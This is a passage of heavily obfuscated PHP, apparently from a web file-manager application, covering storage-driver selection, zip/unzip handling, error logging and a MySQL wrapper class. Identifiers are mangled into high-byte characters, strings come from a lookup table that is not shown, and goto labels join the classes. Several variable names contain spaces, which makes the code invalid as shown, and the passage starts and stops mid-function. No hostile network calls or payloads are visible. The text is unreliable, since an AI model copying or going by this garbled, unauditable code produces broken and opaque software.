driverGet($î„¢¼“‘, &$¯à£ıĞ) { $Õ¥Ú¦åÃ =& $_SERVER[¹Éµ„ºå]; $õµƒ¥£– = $î„¢¼“‘[$Õ¥Ú¦åÃ[1346]]; $²µòÁƒ = $î„¢¼“‘[$Õ¥Ú¦åÃ[487]]; switch ($î„¢¼“‘[$Õ¥Ú¦åÃ[33]]) { case KodIO::KOD_IO: $ìÎ…Ü°î = self::$driverListSystem[$²µòÁƒ]; break; case KodIO::KOD_SOURCE: $¯à£ıĞ = $²µòÁƒ . $¯à£ıĞ; $ìÎ…Ü°î = array($Õ¥Ú¦åÃ[1347] => $Õ¥Ú¦åÃ[1348], $Õ¥Ú¦åÃ[6] => $î„¢¼“‘); $ìÎ…Ü°î[$Õ¥Ú¦åÃ[6]][$Õ¥Ú¦åÃ[1349]] = $î„¢¼“‘[$Õ¥Ú¦åÃ[487]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $åÔŠÙ•„ = $GLOBALS[$Õ¥Ú¦åÃ[1350]]; self::$driverListUser = array_to_keyvalue($åÔŠÙ•„, $Õ¥Ú¦åÃ[487]); } $ìÎ…Ü°î = self::$driverListUser[$²µòÁƒ]; break; case KodIO::KOD_SHARE_LINK: $ìÎ…Ü°î = array($Õ¥Ú¦åÃ[1347] => $Õ¥Ú¦åÃ[1351], $Õ¥Ú¦åÃ[6] => $î„¢¼“‘); $®›†ò¦¢ = Action($Õ¥Ú¦åÃ[1352])->sharePathInfo($î„¢¼“‘[$Õ¥Ú¦åÃ[87]]); $¯à£ıĞ = $®›†ò¦¢[$Õ¥Ú¦åÃ[191]]; if (!$®›†ò¦¢[$Õ¥Ú¦åÃ[191]]) { $±¸·¢Ÿ° = Model($Õ¥Ú¦åÃ[686])->getInfoByHash($î„¢¼“‘[$Õ¥Ú¦åÃ[487]]); $¯à£ıĞ = KodIO::clear($±¸·¢Ÿ°[$Õ¥Ú¦åÃ[583]] . $î„¢¼“‘[$Õ¥Ú¦åÃ[1345]]); $î„¢¼“‘[$Õ¥Ú¦åÃ[576]] = $±¸·¢Ÿ°; $î„¢¼“‘[$Õ¥Ú¦åÃ[1326]] = $¯à£ıĞ; $ìÎ…Ü°î = array($Õ¥Ú¦åÃ[1347] => $Õ¥Ú¦åÃ[1353], $Õ¥Ú¦åÃ[6] => $î„¢¼“‘); } else { $ìÎ…Ü°î[$Õ¥Ú¦åÃ[6]][$Õ¥Ú¦åÃ[1349]] = $®›†ò¦¢[$Õ¥Ú¦åÃ[191]]; } break; case KodIO::KOD_SHARE_ITEM: $ìÎ…Ü°î = array($Õ¥Ú¦åÃ[1347] => $Õ¥Ú¦åÃ[1354], $Õ¥Ú¦åÃ[6] => $î„¢¼“‘); $±¸·¢Ÿ° = Model($Õ¥Ú¦åÃ[686])->getInfo($î„¢¼“‘[$Õ¥Ú¦åÃ[487]]); if ($±¸·¢Ÿ°[$Õ¥Ú¦åÃ[191]] == $Õ¥Ú¦åÃ[228]) { $¯à£ıĞ = KodIO::clear($±¸·¢Ÿ°[$Õ¥Ú¦åÃ[583]] . $î„¢¼“‘[$Õ¥Ú¦åÃ[1345]]); $î„¢¼“‘[$Õ¥Ú¦åÃ[576]] = $±¸·¢Ÿ°; $î„¢¼“‘[$Õ¥Ú¦åÃ[1326]] = $¯à£ıĞ; $ìÎ…Ü°î = array($Õ¥Ú¦åÃ[1347] => $Õ¥Ú¦åÃ[1355], $Õ¥Ú¦åÃ[6] => $î„¢¼“‘); } else { if (!$¯à£ıĞ) { $¯à£ıĞ = $±¸·¢Ÿ°[$Õ¥Ú¦åÃ[191]]; } $ìÎ…Ü°î[$Õ¥Ú¦åÃ[6]][$Õ¥Ú¦åÃ[1349]] = $±¸·¢Ÿ°[$Õ¥Ú¦åÃ[191]]; } break; case KodIO::KOD_SHARE_OUTER: $ìÎ…Ü°î = array($Õ¥Ú¦åÃ[1347] => $Õ¥Ú¦åÃ[1356], $Õ¥Ú¦åÃ[6] => $î„¢¼“‘); break; default: $¯à£ıĞ = $î„¢¼“‘[$Õ¥Ú¦åÃ[87]]; $ìÎ…Ü°î = array($Õ¥Ú¦åÃ[1347] => $Õ¥Ú¦åÃ[1357]); break; } $ããÃŞ¶á = $î„¢¼“‘[$Õ¥Ú¦åÃ[87]]; if (!isset(self::$driverCache[$ããÃŞ¶á])) { $…ıæ¹®º = strtolower($ìÎ…Ü°î[$Õ¥Ú¦åÃ[96]]); $ª•œå”Š = $GLOBALS[$Õ¥Ú¦åÃ[6]][$Õ¥Ú¦åÃ[92]][$Õ¥Ú¦åÃ[925]]; $Ğ°”À”ö = $Õ¥Ú¦åÃ[77] . (isset($ª•œå”Š[$…ıæ¹®º]) ? $ª•œå”Š[$…ıæ¹®º] : ucfirst($…ıæ¹®º)); if (!class_exists($Ğ°”À”ö)) { show_json("{$Ğ°”À”ö}\40\156\x6f\164\x20\145\x78\151\163\164\163\x21", !1); } $‘ûëÂéæ = isset($ìÎ…Ü°î[$Õ¥Ú¦åÃ[6]]) ? $ìÎ…Ü°î[$Õ¥Ú¦åÃ[6]] : !1; self::$driverCache[$ããÃŞ¶á] = new $Ğ°”À”ö($‘ûëÂéæ); } $©ø½äû = self::$driverCache[$ããÃŞ¶á]; $©ø½äû->pathDriver = $õµƒ¥£–; $©ø½äû->pathBase = $Õ¥Ú¦åÃ[12]; if (isset($ìÎ…Ü°î[$Õ¥Ú¦åÃ[6]][$Õ¥Ú¦åÃ[1358]])) { $©ø½äû->pathBase = rtrim($ìÎ…Ü°î[$Õ¥Ú¦åÃ[6]][$Õ¥Ú¦åÃ[1358]], $Õ¥Ú¦åÃ[8]) . $Õ¥Ú¦åÃ[8]; $¯à£ıĞ = $©ø½äû->pathBase . ltrim($¯à£ıĞ, $Õ¥Ú¦åÃ[8]); } $¯à£ıĞ = $©ø½äû->getPath($¯à£ıĞ); if (isset($î„¢¼“‘[$Õ¥Ú¦åÃ[1326]])) { $¯à£ıĞ = $î„¢¼“‘[$Õ¥Ú¦åÃ[1326]]; } $©ø½äû->path = $¯à£ıĞ; return $©ø½äû; } public static function errorTips($›½º®¤ = false, $µûÏ®¨ä = true) { $É¾–° =& $_SERVER[¹Éµ„ºå]; static $ñĞ±–»Á = array(); $£³æøòñ = 100; if ($›½º®¤ === -1) { return $ñĞ±–»Á ? $ñĞ±–»Á[count($ñĞ±–»Á) - 1] : $É¾–°[12]; } if ($›½º®¤ === !1) { return implode($É¾–°[285], $ñĞ±–»Á); } if (count($ñĞ±–»Á) >= $£³æøòñ) { $ñĞ±–»Á = array_slice($ñĞ±–»Á, $£³æøòñ * 0.5, $£³æøòñ); } $ñĞ±–»Á[] = $›½º®¤; if (!$µûÏ®¨ä) { return; } write_log($É¾–°[173] . ACTION . $É¾–°[1359] . $›½º®¤, $É¾–°[1360]); } public static function getLastError($¡·©ç ù = '') { $¾£³Ÿó‰ = self::errorTips(-1); return $¾£³Ÿó‰ ? $¾£³Ÿó‰ : $¡·©ç ù; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¤­–Íì„; if ($¤­–Íì„) { return $¤­–Íì„; } $¡Ğ¢¨Úò = IO::init($_SERVER[¹Éµ„ºå][8]); return $¡Ğ¢¨Úò; } private static function iconvSystem($Ùıà÷Àí) { return self::local()->iconvSystem($Ùıà÷Àí); } private static function iconvApp($ú¿ÀÚã) { return self::local()->iconvApp($ú¿ÀÚã); } public static function zipFolder($¸â’ïÄŞ, $ø‹°™ª€ = "\172\x69\x70", $ôå ˜˜ = '', $„ê±¯¹¤ = REPEAT_RENAME) { $²Ôâ½§à =& $_SERVER[¹Éµ„ºå]; $ÜÑ¶óÊ = IO::listPath($¸â’ïÄŞ); if (!$ÜÑ¶óÊ) { return !1; } $ÜÑ¶óÊ = array_merge($ÜÑ¶óÊ[$²Ôâ½§à[85]], $ÜÑ¶óÊ[$²Ôâ½§à[86]]); return self::zip($ÜÑ¶óÊ, $ø‹°™ª€, $ôå ˜˜, $„ê±¯¹¤); } public static function zip($ˆ»è’, $¾œ¡ÓıÔ = "\x7a\151\x70", $ã€œ‘ş  = '', $Ÿ›ïë”† = REPEAT_RENAME) { $Üõâ”ƒ± =& $_SERVER[¹Éµ„ºå]; if (is_string($ˆ»è’) && $ˆ»è’) { $ˆ»è’ = array(array($Üõâ”ƒ±[87] => $ˆ»è’)); } $Å’¥æîÃ = self::init($ˆ»è’[0][$Üõâ”ƒ±[87]]); $ã‰ ¦Ú = self::info($ˆ»è’[0][$Üõâ”ƒ±[87]]); $•åËòÕ× = $Üõâ”ƒ±[12]; $Ğ»Ò¶ãô = $Üõâ”ƒ±[12]; $×›­’² = $Üõâ”ƒ±[12]; if ($ã€œ‘ş  && substr($ã€œ‘ş , -1, 1) != $Üõâ”ƒ±[8]) { $Ğ»Ò¶ãô = get_path_father($ã€œ‘ş ); $×›­’² = get_path_this($ã€œ‘ş ); } else { $Ğ»Ò¶ãô = self::pathFather($ã‰ ¦Ú[$Üõâ”ƒ±[87]]); $×›­’² = $ã‰ ¦Ú[$Üõâ”ƒ±[32]] . $Üõâ”ƒ±[10] . $¾œ¡ÓıÔ; if (count($ˆ»è’) > 1) { $¤Ş™ïåÏ = IO::info($Ğ»Ò¶ãô); $×›­’² = $¤Ş™ïåÏ[$Üõâ”ƒ±[32]] . $Üõâ”ƒ±[10] . $¾œ¡ÓıÔ; } if ($ã€œ‘ş ) { $Ğ»Ò¶ãô = $ã€œ‘ş ; } } if ($Å’¥æîÃ->getType() == $Üõâ”ƒ±[106]) { $–÷íùœí = self::init($Ğ»Ò¶ãô); $ğºÓÕê = $–÷íùœí->getType() == $Üõâ”ƒ±[106] ? $Ğ»Ò¶ãô : get_path_father($Å’¥æîÃ->path); $ğºÓÕê = IO::getPathInner($ğºÓÕê); $ğºÓÕê = rtrim($ğºÓÕê, $Üõâ”ƒ±[8]) . $Üõâ”ƒ±[8]; mk_dir($ğºÓÕê); } else { $•åËòÕ× = TEMP_FILES . $Üõâ”ƒ±[1361] . time() . rand_string(8) . $Üõâ”ƒ±[8]; mk_dir($•åËòÕ×); file_put_contents($•åËòÕ× . $Üõâ”ƒ±[1362], $Üõâ”ƒ±[12]); $ğºÓÕê = $•åËòÕ×; } $åö¿ãÍœ = IO::info($ğºÓÕê); if (!$åö¿ãÍœ || !$åö¿ãÍœ[$Üõâ”ƒ±[233]]) { show_json(LNG($Üõâ”ƒ±[1363]), !1); } $•é­íª = self::zipFileList($ˆ»è’, $•åËòÕ×); foreach ($•é­íª as $‹¸òóŞ => $†¦ĞßíÑ) { $•é­íª[$‹¸òóŞ] = self::iconvSystem($†¦ĞßíÑ); } $‚·„šˆË = get_filename_auto($ğºÓÕê . $×›­’², $Üõâ”ƒ±[12], $Ÿ›ïë”†); KodArchive::create(self::iconvSystem($‚·„šˆË), $•é­íª); if (!IO::exist($‚·„šˆË)) { if ($•åËòÕ×) { del_dir($•åËòÕ×); } write_log($Üõâ”ƒ±[1364] . $‚·„šˆË, $Üõâ”ƒ±[388]); show_json(LNG($Üõâ”ƒ±[1365]), !1); } if (!$•åËòÕ×) { return $‚·„šˆË; } $÷¡¯°âõ = self::move($‚·„šˆË, $Ğ»Ò¶ãô, $Ÿ›ïë”†); if ($•åËòÕ×) { del_dir($•åËòÕ×); } if (!$‚·„šˆË) { write_log($Üõâ”ƒ±[1366] . $‚·„šˆË . $Üõâ”ƒ±[1367] . $Ğ»Ò¶ãô, $Üõâ”ƒ±[388]); show_json(LNG($Üõâ”ƒ±[1365]), !1); } return $÷¡¯°âõ; } public static function unzip($ÖµÚÀ¨×, $€–Ïú—, $ŠšÛ³ = "\x2d\61", $ˆŠ­ïœç = "\162\145\x70\x6c\141\x63\145") { $½ÅÛÓÔ =& $_SERVER[¹Éµ„ºå]; $‚ËÏâõú = parent::info($ÖµÚÀ¨×); if (!$‚ËÏâõú) { show_json(LNG($½ÅÛÓÔ[1368]), !1); } $ã‰ÆÚé– = IO::infoFullSimple($€–Ïú—); if (!$ã‰ÆÚé–) { $€–Ïú— = IO::mkdir($€–Ïú—); } if (isset($ã‰ÆÚé–[$½ÅÛÓÔ[191]]) && trim($ã‰ÆÚé–[$½ÅÛÓÔ[87]], $½ÅÛÓÔ[8]) != trim($€–Ïú—, $½ÅÛÓÔ[8])) { $âûüÜ„ = KodIO::make($ã‰ÆÚé–[$½ÅÛÓÔ[190]]); $ß¿“Òé = IO::fileNameAuto($âûüÜ„, $ã‰ÆÚé–[$½ÅÛÓÔ[32]], REPEAT_RENAME_FOLDER, !0); $€–Ïú— = IO::mkdir($âûüÜ„ . $ß¿“Òé); } $ŠšÛ³ = $ŠšÛ³ && $ŠšÛ³ != $½ÅÛÓÔ[1369] ? @json_decode($ŠšÛ³, !0) : -1; $áê¡˜ÄÜ = self::unzipPart($ÖµÚÀ¨×, $ŠšÛ³); if (!$áê¡˜ÄÜ || !IO::exist($áê¡˜ÄÜ[$½ÅÛÓÔ[230]])) { show_json(LNG($½ÅÛÓÔ[105]), !1); } $¹Ç¢õ¤ñ = $áê¡˜ÄÜ[$½ÅÛÓÔ[1370]][count($áê¡˜ÄÜ[$½ÅÛÓÔ[1370]]) - 1]; if ($¹Ç¢õ¤ñ[$½ÅÛÓÔ[1298]] == -1 || substr($¹Ç¢õ¤ñ[$½ÅÛÓÔ[32]], -1, 1) == $½ÅÛÓÔ[8]) { $¾»öÛ¡ù = $áê¡˜ÄÜ[$½ÅÛÓÔ[1371]] . rand_string(10) . $½ÅÛÓÔ[8]; mk_dir($¾»öÛ¡ù); $éêÂ‘±ƒ = count($áê¡˜ÄÜ[$½ÅÛÓÔ[1370]]) == 1 ? IO::ext($ÖµÚÀ¨×) : get_path_ext($áê¡˜ÄÜ[$½ÅÛÓÔ[230]]); $Ê“–Ï¹Œ = KodArchive::extract(self::iconvSystem($áê¡˜ÄÜ[$½ÅÛÓÔ[230]]), $¾»öÛ¡ù, $¹Ç¢õ¤ñ[$½ÅÛÓÔ[1298]], $ß¿“Òé, $éêÂ‘±ƒ); self::unzipErrorCheck($Ê“–Ï¹Œ, array($½ÅÛÓÔ[1372], $ÖµÚÀ¨×, $éêÂ‘±ƒ, $€–Ïú—, $áê¡˜ÄÜ)); Hook::trigger($½ÅÛÓÔ[1373], $¾»öÛ¡ù); recursion_dir($¾»öÛ¡ù, $¬Ğ¦îÖî, $âšñğÍ¹, 0); $–öö‚· = array_merge($¬Ğ¦îÖî, $âšñğÍ¹); $ÕçŞ€À = array(); foreach ($–öö‚· as $„½¼) { $áÎ‚ÙïÆ = IO::move(self::iconvApp($„½¼), $€–Ïú—, $ˆŠ­ïœç); if ($áÎ‚ÙïÆ) { $ÕçŞ€À[] = $áÎ‚ÙïÆ; } } del_dir($¾»öÛ¡ù); } else { $áÎ‚ÙïÆ = IO::move($áê¡˜ÄÜ[$½ÅÛÓÔ[230]], $€–Ïú—, $ˆŠ­ïœç, get_path_this($¹Ç¢õ¤ñ[$½ÅÛÓÔ[32]])); if ($áÎ‚ÙïÆ) { $ÕçŞ€À[] = $áÎ‚ÙïÆ; } } return $ÕçŞ€À ? $ÕçŞ€À : !1; } public static function unzipList($åòö‚ùï) { $¡ã»æ— =& $_SERVER[¹Éµ„ºå]; $Êü†±Ÿõ = isset($åòö‚ùï[$¡ã»æ—[1374]]) ? $åòö‚ùï[$¡ã»æ—[1374]] : !1; $—…êÀ¢´ = isset($åòö‚ùï[$¡ã»æ—[1298]]) ? @json_decode($åòö‚ùï[$¡ã»æ—[1298]], !0) : -1; $óİ…ë¨ = self::unzipPart($åòö‚ùï[$¡ã»æ—[87]], $—…êÀ¢´); if (!$óİ…ë¨ || !IO::exist($óİ…ë¨[$¡ã»æ—[230]])) { show_json(LNG($¡ã»æ—[105]), !1); } $™ŠÑøşâ = $óİ…ë¨[$¡ã»æ—[1370]][count($óİ…ë¨[$¡ã»æ—[1370]]) - 1]; $õƒÙòø¶ = in_array(IO::ext($óİ…ë¨[$¡ã»æ—[230]]), array($¡ã»æ—[388], $¡ã»æ—[1375], $¡ã»æ—[1376], $¡ã»æ—[1377], $¡ã»æ—[1378], $¡ã»æ—[1379])); if (!$Êü†±Ÿõ && ($™ŠÑøşâ[$¡ã»æ—[1298]] == -1 || $õƒÙòø¶)) { $ØŒü–«ı = $óİ…ë¨[$¡ã»æ—[1371]] . get_path_this($óİ…ë¨[$¡ã»æ—[230]]) . $¡ã»æ—[951]; if (!IO::exist($ØŒü–«ı)) { $¾Æ–Ğñå = $™ŠÑøşâ[$¡ã»æ—[1298]] == -1 ? get_path_ext(IO::pathThis($åòö‚ùï[$¡ã»æ—[87]])) : get_path_ext($óİ…ë¨[$¡ã»æ—[230]]); $õòôŒ² = KodArchive::listContent(self::iconvSystem($óİ…ë¨[$¡ã»æ—[230]]), !0, $¾Æ–Ğñå); self::unzipErrorCheck($õòôŒ², array($¡ã»æ—[1380], $åòö‚ùï, $óİ…ë¨)); @file_put_contents($ØŒü–«ı, json_encode($õòôŒ²[$¡ã»æ—[1381]])); } return @json_decode(IO::getContent($ØŒü–«ı), !0); } IO::fileOut($óİ…ë¨[$¡ã»æ—[230]], $Êü†±Ÿõ, get_path_this($™ŠÑøşâ[$¡ã»æ—[32]])); die; } private static function zipFileList($¿úŠ¾Êğ, $›±Î¶”Ã = false) { $œµëÄ¾ =& $_SERVER[¹Éµ„ºå]; $Øƒ³üÅË = array(); foreach ($¿úŠ¾Êğ as $Ú¹ÛÚÆæ) { $®àŒĞì† = $Ú¹ÛÚÆæ[$œµëÄ¾[87]]; if ($›±Î¶”Ã) { $®àŒĞì† = self::copy($Ú¹ÛÚÆæ[$œµëÄ¾[87]], $›±Î¶”Ã, $œµëÄ¾[918]); } else { $½£‡¼£İ = self::init($Ú¹ÛÚÆæ[$œµëÄ¾[87]]); if ($½£‡¼£İ->getType() == $œµëÄ¾[106]) { $®àŒĞì† = $½£‡¼£İ->path; } } if ($®àŒĞì† && self::local()->exist($®àŒĞì†)) { $Øƒ³üÅË[$Ú¹ÛÚÆæ[$œµëÄ¾[87]]] = $®àŒĞì†; } } if (!empty($Øƒ³üÅË)) { return array_values($Øƒ³üÅË); } show_json(LNG($œµëÄ¾[1340]), !1); } private static function localFilePath($ÆµÒ³‰Ü) { $ÜƒàøÎˆ =& $_SERVER[¹Éµ„ºå]; $©£ˆ¥• = KodIO::parse($ÆµÒ³‰Ü); if ($©£ˆ¥•[$ÜƒàøÎˆ[33]] == KodIO::KOD_SOURCE) { $àïÇÜƒ× = Model($ÜƒàøÎˆ[924])->fileInfoGet(KodIO::sourceID($ÆµÒ³‰Ü)); if (!$àïÇÜƒ×[$ÜƒàøÎˆ[87]]) { show_json($ÜƒàøÎˆ[1382], !1); } $ÆµÒ³‰Ü = $àïÇÜƒ×[$ÜƒàøÎˆ[87]]; } $ïØ¡²ÜÓ = self::init($ÆµÒ³‰Ü); if ($ïØ¡²ÜÓ->pathParse[$ÜƒàøÎˆ[1326]]) { $ÆµÒ³‰Ü = $ïØ¡²ÜÓ->pathParse[$ÜƒàøÎˆ[1326]]; $ïØ¡²ÜÓ = self::init($ÆµÒ³‰Ü); } $Ê¢ÊÁÒ² = $ïØ¡²ÜÓ->getType(); if ($Ê¢ÊÁÒ² == $ÜƒàøÎˆ[106] || $Ê¢ÊÁÒ² == $ÜƒàøÎˆ[1383]) { if (!$ïØ¡²ÜÓ->exist($ïØ¡²ÜÓ->path)) { show_json(LNG($ÜƒàøÎˆ[105]), !1); } return $ïØ¡²ÜÓ->path; } return !1; } public static function unzipPart($ñæšË€Ò, $Ìê¾ğ“ = -1) { $Œ½Ö½öº =& $_SERVER[¹Éµ„ºå]; $•ÇªĞ”ø = IO::pathThis($ñæšË€Ò); if (!$Ìê¾ğ“ || $Ìê¾ğ“ == -1) { $¶¦Á°¨Â = array(array($Œ½Ö½öº[32] => $•ÇªĞ”ø, $Œ½Ö½öº[1298] => -1)); $¶¦Á°¨Â[0][$Œ½Ö½öº[1384]] = $¶¦Á°¨Â[0][$Œ½Ö½öº[32]]; } else { if (is_array($Ìê¾ğ“)) { $¶¦Á°¨Â = $Ìê¾ğ“; $­É“œğì = count($¶¦Á°¨Â) - 1; for ($ò¸¤§‘· = 0; $ò¸¤§‘· <= $­É“œğì; $ò¸¤§‘·++) { $ô£Áˆ = $¶¦Á°¨Â[$ò¸¤§‘·]; $àù­ôãò = get_path_this($ô£Áˆ[$Œ½Ö½öº[32]]) . (checkExtSafe($ô£Áˆ[$Œ½Ö½öº[32]]) ? $Œ½Ö½öº[12] : $Œ½Ö½öº[1385]); $¶¦Á°¨Â[$ò¸¤§‘·][$Œ½Ö½öº[1384]] = $Œ½Ö½öº[1386] . intval($ô£Áˆ[$Œ½Ö½öº[1298]]) . $Œ½Ö½öº[476] . $àù­ôãò; if ($ò¸¤§‘· == 0) { continue; } $¶¦Á°¨Â[$ò¸¤§‘·][$Œ½Ö½öº[1384]] = $¶¦Á°¨Â[$ò¸¤§‘· - 1][$Œ½Ö½öº[1384]] . $Œ½Ö½öº[1387] . $¶¦Á°¨Â[$ò¸¤§‘·][$Œ½Ö½öº[1384]]; } } } if (!is_array($¶¦Á°¨Â) || count($¶¦Á°¨Â) == 0) { return !1; } $ş‹°ìÊô = $¶¦Á°¨Â[count($¶¦Á°¨Â) - 1]; if (!IO::exist($ñæšË€Ò)) { return !1; } $¬ñ–ĞÅ… = TEMP_FILES . $Œ½Ö½öº[1388] . kodIO::hashPathSafe($ñæšË€Ò) . $Œ½Ö½öº[8]; $ŒÁñâŞ½ = $¬ñ–ĞÅ… . $ş‹°ìÊô[$Œ½Ö½öº[1384]]; mk_dir($¬ñ–ĞÅ…); file_put_contents(TEMP_FILES . $Œ½Ö½öº[1362], $Œ½Ö½öº[12]); if (IO::exist($ŒÁñâŞ½)) { return array($Œ½Ö½öº[230] => $ŒÁñâŞ½, $Œ½Ö½öº[1370] => $¶¦Á°¨Â, $Œ½Ö½öº[1371] => $¬ñ–ĞÅ…); } $óüÖ¡ø· = self::localFilePath($ñæšË€Ò); if (!$óüÖ¡ø·) { $óüÖ¡ø· = $¬ñ–ĞÅ… . $Œ½Ö½öº[1389]; if (!IO::exist($óüÖ¡ø·)) { self::copy($ñæšË€Ò, $¬ñ–ĞÅ…, !1, get_path_this($óüÖ¡ø·)); } } if (!$óüÖ¡ø· || !IO::exist($óüÖ¡ø·)) { return !1; } if ($ş‹°ìÊô[$Œ½Ö½öº[1298]] == -1) { return array($Œ½Ö½öº[230] => $óüÖ¡ø·, $Œ½Ö½öº[1370] => $¶¦Á°¨Â, $Œ½Ö½öº[1371] => $¬ñ–ĞÅ…); } $ øƒ€² = $óüÖ¡ø·; foreach ($¶¦Á°¨Â as $ò¸¤§‘· => $ô£Áˆ) { if (!$ô£Áˆ || $ô£Áˆ[$Œ½Ö½öº[1298]] == $Œ½Ö½öº[1369]) { break; } if (substr($ô£Áˆ[$Œ½Ö½öº[32]], -1, 1) == $Œ½Ö½öº[8]) { break; } $„¯áà° = in_array(get_path_ext($ô£Áˆ[$Œ½Ö½öº[1384]]), array($Œ½Ö½öº[388], $Œ½Ö½öº[1375], $Œ½Ö½öº[1376], $Œ½Ö½öº[1377], $Œ½Ö½öº[1378], $Œ½Ö½öº[1379])); $¨îâÑµà = $ò¸¤§‘· == count($¶¦Á°¨Â) - 1 && $„¯áà°; $¬¢ÙÈ¨ = $¬ñ–ĞÅ… . $ô£Áˆ[$Œ½Ö½öº[1384]]; $ ëî«è = $¬ñ–ĞÅ… . get_path_this($ô£Áˆ[$Œ½Ö½öº[32]]); if (IO::exist($¬¢ÙÈ¨)) { $ øƒ€² = $¬¢ÙÈ¨; continue; } $¥‹–Âø  = $ò¸¤§‘· == 0 ? get_path_ext($•ÇªĞ”ø) : get_path_ext($ øƒ€²); $Ëëñíî = KodArchive::extract(self::iconvSystem($ øƒ€²), $¬ñ–ĞÅ…, $ô£Áˆ[$Œ½Ö½öº[1298]], $‰Ø§Šğ‹, $¥‹–Âø ); self::unzipErrorCheck($Ëëñíî, array($Œ½Ö½öº[1390], $ñæšË€Ò, $¶¦Á°¨Â, $ô£Áˆ, $¬¢ÙÈ¨)); if (IO::exist($ ëî«è)) { IO::rename($ ëî«è, get_path_this($¬¢ÙÈ¨)); } $ øƒ€² = $¬¢ÙÈ¨; } $ŒÁñâŞ½ = $ øƒ€²; return array($Œ½Ö½öº[230] => $ øƒ€², $Œ½Ö½öº[1370] => $¶¦Á°¨Â, $Œ½Ö½öº[1371] => $¬ñ–ĞÅ…); } private static function unzipErrorCheck($¤ìÑÍ‹ù, $ÁÌÜî÷ = false) { $ÎËŸ–âÏ =& $_SERVER[¹Éµ„ºå]; if ($¤ìÑÍ‹ù[$ÎËŸ–âÏ[1391]]) { return !0; } write_log(array($ÎËŸ–âÏ[1392], $¤ìÑÍ‹ù, $ÁÌÜî÷), $ÎËŸ–âÏ[1393]); $Ä×ä¸ã = is_array($¤ìÑÍ‹ù[$ÎËŸ–âÏ[1381]]) ? json_encode($¤ìÑÍ‹ù[$ÎËŸ–âÏ[1381]]) : $¤ìÑÍ‹ù[$ÎËŸ–âÏ[1381]]; show_json($ÎËŸ–âÏ[1394] . $Ä×ä¸ã, !1); die; } } goto Eáó¤Æ¿Œ; AÔ„…–ÓÄô: class DbMysql extends Db { public function __construct($’„İ¹æú = '') { $³¦¹¢Ğ =& $_SERVER[¹Éµ„ºå]; if (!extension_loaded($³¦¹¢Ğ[892])) { think_exception(think_lang($³¦¹¢Ğ[14]) . $³¦¹¢Ğ[1039]); } if (!empty($’„İ¹æú)) { $this->config = $’„İ¹æú; if (empty($this->config[$³¦¹¢Ğ[17]])) { $this->config[$³¦¹¢Ğ[17]] = $³¦¹¢Ğ[12]; } } } public function connect($³‡Ò®ğ¢ = '', $ç‹•Ùğ¿ = 0, $¼…ÅªÑ” = false) { $Ò–Âìã =& $_SERVER[¹Éµ„ºå]; if (!isset($this->linkID[$ç‹•Ùğ¿])) { if (empty($³‡Ò®ğ¢)) { $³‡Ò®ğ¢ = $this->config; } $«ò‘‡¸… = $³‡Ò®ğ¢[$Ò–Âìã[1040]] . ($³‡Ò®ğ¢[$Ò–Âìã[1041]] ? "\72{$³‡Ò®ğ¢[$Ò–Âìã[1041]]}" : $Ò–Âìã[12]); $åíªøÃ = !empty($³‡Ò®ğ¢[$Ò–Âìã[17]][$Ò–Âìã[18]]) ? $³‡Ò®ğ¢[$Ò–Âìã[17]][$Ò–Âìã[18]] : $this->pconnect; if ($åíªøÃ) { $this->linkID[$ç‹•Ùğ¿] = mysql_pconnect($«ò‘‡¸…, $³‡Ò®ğ¢[$Ò–Âìã[1042]], $³‡Ò®ğ¢[$Ò–Âìã[1043]], 131072); } else { $this->linkID[$ç‹•Ùğ¿] = mysql_connect($«ò‘‡¸…, $³‡Ò®ğ¢[$Ò–Âìã[1042]], $³‡Ò®ğ¢[$Ò–Âìã[1043]], !0, 131072); } if (!$this->linkID[$ç‹•Ùğ¿] || !empty($³‡Ò®ğ¢[$Ò–Âìã[21]]) && !mysql_select_db($³‡Ò®ğ¢[$Ò–Âìã[21]], $this->linkID[$ç‹•Ùğ¿])) { think_exception(mysql_error()); } $¨’É¦ë = mysql_get_server_info($this->linkID[$ç‹•Ùğ¿]); mysql_query($Ò–Âìã[1044] . think_config($Ò–Âìã[1045]) . $Ò–Âìã[58], $this->linkID[$ç‹•Ùğ¿]); if ($¨’É¦ë > $Ò–Âìã[1046]) { mysql_query($Ò–Âìã[1047], $this->linkID[$ç‹•Ùğ¿]); } $this->connected = !0; if (1 != think_config($Ò–Âìã[22])) { unset($this->config); } } return $this->linkID[$ç‹•Ùğ¿]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ùşéùÙ“) { $Â³ƒ€€Ò =& $_SERVER[¹Éµ„ºå]; if (0 === stripos($ùşéùÙ“, $Â³ƒ€€Ò[342])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ùşéùÙ“; if ($this->queryID) { $this->free(); } think_action_status($Â³ƒ€€Ò[23], 1); think_status($Â³ƒ€€Ò[24]); $this->queryID = mysql_query($ùşéùÙ“, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($•Åù¬ÅÁ) { $ÉÀ’Ò°Ÿ =& $_SERVER[¹Éµ„ºå]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $•Åù¬ÅÁ; if ($this->queryID) { $this->free(); } think_action_status($ÉÀ’Ò°Ÿ[25], 1); think_status($ÉÀ’Ò°Ÿ[24]); $Ë‹ÂŸè = mysql_query($•Åù¬ÅÁ, $this->_linkID); $this->debug(); if (!1 === $Ë‹ÂŸè) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¹Éµ„ºå][1048], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ª‘ê˜çù = mysql_query($_SERVER[¹Éµ„ºå][1049], $this->_linkID); $this->transTimes = 0; if (!$ª‘ê˜çù) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ğğå«Ùª = mysql_query($_SERVER[¹Éµ„ºå][1050], $this->_linkID); $this->transTimes = 0; if (!$ğğå«Ùª) { $this->error(); return !1; } } return !0; } private function getAll() { $’½½ú› = array(); if ($this->numRows > 0) { while ($Ôº•‘ = mysql_fetch_assoc($this->queryID)) { $’½½ú›[] = 